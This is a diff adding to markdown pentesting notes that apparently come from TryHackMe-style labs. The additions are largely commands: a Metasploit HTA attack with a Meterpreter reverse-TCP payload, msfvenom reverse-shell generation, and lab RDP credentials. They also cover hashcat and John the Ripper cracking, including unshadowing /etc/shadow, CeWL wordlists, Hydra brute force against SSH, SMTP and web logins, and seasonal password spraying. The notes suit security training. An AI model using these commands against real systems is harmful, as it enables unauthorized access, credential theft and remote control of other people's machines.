@@ -105,6 +105,31 @@ meterpreter > shell
 meterpreter > sysinfo
 ```
 
+### Install latest Metasploit
+
+```
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+chmod +x msfinstall
+./msfinstall
+dpkg --listfiles metasploit-framework
+ln -s -f /opt/metasploit-framework/bin/msfconsole /usr/local/bin/msfconsole
+```
+
+### HTA attack
+
+```
+msfconsole
+set LHOST 10.10.96.223
+set LPORT 443
+set SRVHOST 10.10.96.223
+set payload windows/meterpreter/reverse_tcp
+use exploit/windows/misc/hta_server
+run
+sessions
+sessions -i 1
+sysinfo
+```
+
 ## Meterpreter
 
 Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection stagers and is extended over the network at runtime.
@@ -144,3 +169,118 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IPADDR LPORT=443 -f hta-psh -o 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=443 -f vba -o vba.txt
 ```
+
+## Connect via RDP
+
+```
+xfreerdp /v:10.10.255.14 /u:thm /p:TryHackM3 +clipboard
+```
+
+## CUPP - Common User Passwords Profiler
+
+```
+git clone https://github.com/Mebus/cupp.git
+```
+
+## Dictionary attack Hashcat
+
+https://hashcat.net/wiki/doku.php?id=hashcat
+
+```
+brew install hashcat
+```
+
+E.g.
+```
+hashcat -a 3 -m 100 8d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou.txt
+hashcat -a 3 -m 0 e48e13207341b6bffb7fb1622282247b ?d?d?d?d
+```
+
+## Hash ID
+
+```
+apt install hashid
+```
+
+```
+https://github.com/psypanda/hashID
+```
+
+## John the Ripper password cracker
+
+KoreLogic's rules in John the Ripper
+https://contest-2010.korelogic.com/rules.html
+
+E.g
+john --wordlist=words.txt --rules=tornord --stdout 
+```
+[List.Rules.tornord]
+Az"[0-9][0-9]" ^[!@]
+```
+
+john --wordlist=words.txt --rules=tornord > passwords.txt
+hydra -L usernames-list.txt -P passwords.txt -t 4 ssh://10.10.225.196
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2022-11-05 10:09:23
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 180 login tries (l:9/p:20), ~45 tries per task
+
+https://www.cyberciti.biz/faq/unix-linux-password-cracking-john-the-ripper/
+
+Linux/Debian/Ubuntu
+```
+sudo unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db
+john -show /tmp/crack.password.db
+```
+
+## CeWL Custom Word List generator
+
+CeWL is a ruby app which spiders a given URL, up to a specified depth, and returns a list of words which can then be used for password crackers such as John the Ripper. Optionally, CeWL can follow external links.
+
+https://digi.ninja/projects/cewl.php
+https://github.com/digininja/CeWL
+https://www.kali.org/tools/cewl/
+CeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+
+E.g.
+cewl -w list.txt -d 2 -m 2 http://thm.labs
+
+## Hydra
+
+```
+hydra -l pittman@clinic.thmredteam.com -P pwres.txt smtp://10.10.224.93:25 -v
+hydra -l phillips -P pwres.txt 10.10.230.190 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
+
+john --wordlist=clinic.lst --rules=Single-Extra --stdout > pwres.txt
+hydra -l burgess -P pwres.txt 10.10.230.190 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
+```
+
+admin
+victim
+dummy
+adm
+sammy
+phillips
+burgess
+pittman
+guess
+
+Fall
+Autumn
+Spring
+Sommer
+Winter
+
+## Password spray attack
+
+SSH
+hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
+
+RDPassSpray
+https://github.com/xFreed0m/RDPassSpray
+
+python3 -m pip install -r requirements.txt
+
+```
+python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
+```
+
